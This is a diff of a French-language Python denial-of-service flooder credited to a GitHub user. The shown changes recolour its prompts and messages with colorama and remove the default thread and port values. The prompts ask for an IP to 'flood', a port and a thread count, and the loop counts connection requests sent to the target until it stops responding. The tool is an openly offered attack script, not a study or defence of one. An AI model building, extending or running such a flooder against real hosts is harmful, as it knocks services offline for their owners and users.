@@ -4,6 +4,7 @@ import sys
 import time
 from sys import platform
 import os
+from colorama import Fore
 
 if platform == "linux" or platform == "linux2":
     os.system('clear')
@@ -25,20 +26,13 @@ print('\033[95m' + "By @tensh1hx | https://github.com/tensh1hx | You can modify 
 print("")
 print("")
 
-target = input('\033[92m' + "[?] Entrez l'IP à target: ")
-port = input('\033[92m' + "[?] Entrez un port: ")
-threads = input('\033[92m' + "[?] Entrez le nombre de threads à amorcer (342 par exemple): ")
-compteur = 1
-
-if threads == '':
-    threads = 342
-
-if port == '':
-    port = 80
+target = input(f"{Fore.WHITE}[ {Fore.BLUE}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Entrez l'IP à flood:{Fore.WHITE} ")
+port = input(f"{Fore.WHITE}[ {Fore.BLUE}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Entrez un port:{Fore.WHITE} ")
+threads = input(f"{Fore.WHITE}[ {Fore.BLUE}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Entrez le nombre de threads à amorcer:{Fore.WHITE} ")
+compteur = 0
 
 port = int(port)
 threads = int(threads)
-
 
 def attaque():
     while True:
@@ -52,11 +46,11 @@ def attaque():
 
             compteur += 1
 
-            print('\033[92m' + "[✓] {} requêtes envoyées avec succès à {}".format(compteur, target))
+            print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {compteur} {Fore.LIGHTBLACK_EX}requêtes envoyées avec succès à {target}".format(compteur, target))
 
             s.close
         except socket.error:
-            print('\033[91m' + "[!] Connexion impossible! L'IP spécifiée ne répond plus.")
+            print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Connexion impossible! {target} ne répond plus.")
             socket.close
             break
 
@@ -69,7 +63,6 @@ while True:
     try:
         time.sleep(0.1)
     except KeyboardInterrupt:
-        print('\033[91m' + "\n[*] Vous avez décidé d'arrêter l'attaque.")
-        print("")
+        print(f"\n{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Vous avez décidé d'arrêter l'attaque.")
         socket.close
         sys.exit()
